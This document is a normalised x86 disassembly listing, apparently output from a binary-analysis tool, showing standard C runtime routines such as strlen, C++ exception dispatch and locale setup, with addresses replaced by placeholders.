jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_1001dbd0
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi eax
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
mov ecx ebx
call sub_1001c4dc
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_1001acd0
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_1001cbb0
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_1001aba0
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_1002405f
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1001ea23
mov ecx [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
mov [ ebp + edi - 0x88 ] al
lea eax [ ebp - 0x88 ]
push eax
call sub_1001c4dc
pop ecx
test eax eax
je r-xdata
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_10025df0
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_1001ca32
push 0x14
push r--data
call sub_10020070
and [ ebp - 0x20 ] 0x0
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_1001e316
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_1001f0c5
or [ esi + 0x70 ] 0x10
and [ ebp - 0x4 ] 0x0
xor edi edi
inc edi
push edi
push 0xd8
call sub_1001bd01
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x24 ] ebx
test ebx ebx
je r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001cba1
mov eax [ ebp - 0x20 ]
push 0xc
call sub_10023fbf
pop ecx
mov [ ebp - 0x4 ] edi
mov ecx [ esi + 0x6c ]
mov eax ebx
call sub_1001bea3
and [ ebp - 0x4 ] 0x0
call sub_1001cb64
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
call sub_1001c816
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
call sub_100200b5
retn
push ebx
call sub_1001ee94
push ebx
call sub_1001ef2d
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0xc
call sub_10023fbf
pop ecx
mov [ ebp - 0x4 ] 0x2
lea edi [ esi + 0x6c ]
push ebx
push edi
call sub_1001f078
push ebx
call sub_1001ee94
add esp 0xc
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_1001dbd0
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1001cb70
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] edi
push [ edi ]
push rw-data
call sub_1001f078
pop ecx
pop ecx
mov eax [ rw-data ]
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
sub_1001cbb0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_1001cc3b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
js r-xdata
call sub_10025e30
mov esi [ eax ]
call sub_10025e30
cmp esi [ eax ]
jl r-xdata
call sub_10025e36
mov eax [ eax + esi * 4 ]
pop esi
pop ebp
retn
sub_1001cc63
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
call sub_1001e29d
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
mov edi 0x86
cmp [ esi + 0x24 ] ebx
jne r-xdata
mov eax r--data
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ esi + 0x24 ]
call sub_1001cc3b
push eax
push edi
push esi
call sub_1001daf3
add esp 0x10
test eax eax
jne r-xdata
push 0x1
push edi
call sub_1001bd01
pop ecx
pop ecx
mov [ esi + 0x24 ] eax
cmp eax ebx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001ea23
int3
mov eax esi
jmp r-xdata
mov eax r--data
pop edi
sub_1001ccd8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10019c01
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
pop ecx
sub_1001ccff
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_1001dbd0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_1001cd5e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_1001e316
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_1001e316
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_1001e316
and [ eax + 0x90 ] 0x0
jmp sub_1001e648
sub_1001cdad
push 0x10
push r--data
call sub_10020070
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001ce6f
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_1001e316
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_100200b5
retn
call sub_1001e694
call sub_1001e694
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_1001e6e0
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_1001ce89
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_1001e316
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_1001cece
push 0x8
push r--data
call sub_10020070
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_100200b5
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_1001a457
mov [ ebp - 0x4 ] 0xfffffffe
sub_1001cf23
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_1001cf5d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_1001e694
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_1001ccff
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_1001d021
push 0x2c
push r--data
call sub_10020070
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_1001a704
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_1001e316
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_1001e316
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_1001e316
mov [ eax + 0x88 ] esi
call sub_1001e316
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_1001a7a9
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1001d147
mov eax [ ebp - 0x1c ]
call sub_100200b5
retn
sub_1001d0ba
mov esp [ ebp - 0x18 ]
call sub_1001e316
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_1001cdad
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1001d147
mov eax [ ebp - 0x1c ]
call sub_100200b5
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_1001d147
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_1001a757
pop ecx
call sub_1001e316
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_1001e316
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_1001a730
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_1001cece
pop ecx
pop ecx
sub_1001d1bd
push 0xc
push r--data
call sub_10020070
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_10025e3c
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_10025e3c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1001e694
push ebx
push esi
call sub_10025e3c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10025e3c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10025e3c
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_10025e3c
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_10025e3c
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_10025e3c
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_1001a060
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_10025e3c
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_1001cf23
pop ecx
pop ecx
push eax
push esi
call sub_1001a060
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_100200b5
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_1001cf23
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_1001d33c
push 0x8
push r--data
call sub_10020070
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1001cf23
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1001a457
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_1001d1bd
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100200b5
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1001cf23
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1001a457
jmp r-xdata
sub_1001d3ce
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_1001d33c
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_1001a425
call sub_1001a45e
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_1001cdad
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_1001d021
add esp 0x28
test eax eax
je r-xdata
sub_1001d43c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_1001e316
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_1001e316
lea edi [ eax + 0x80 ]
call sub_1001e166
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_1001a691
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_1001e694
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1001a51b
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001d3ce
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_1001d543
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_1001e694
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_1001e316
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_1001e694
call sub_1001e648
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1001d43c
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_1001e316
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_1001e316
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_1001e316
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_10025e3c
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_1001a691
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_1001e694
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_1001cece
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_1001e316
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_1001e316
mov edi [ eax + 0x94 ]
call sub_1001e316
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_1001cf5d
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_1001cf5d
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_10019cc4
test al al
jne r-xdata
call sub_1001e694
cmp eax 0x19930522
jne r-xdata
call sub_1001e316
call sub_1001e316
call sub_1001e316
mov [ eax + 0x88 ] esi
call sub_1001e316
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_1001ccff
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_1001cece
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_10019ba5
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_1001a898
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_1001d3ce
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_1001a45e
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1001cdad
add esp 0x10
push [ esi + 0x1c ]
call sub_1001cfd8
sub_1001d8d5
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_1001e316
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_1001d543
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1001cdad
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1001d9bb
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_1001bddd
push 0x16
pop esi
mov [ eax ] esi
call sub_1001ea75
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_1001bddd
push 0x16
pop esi
pop ebx
pop ebp
retn 0xc
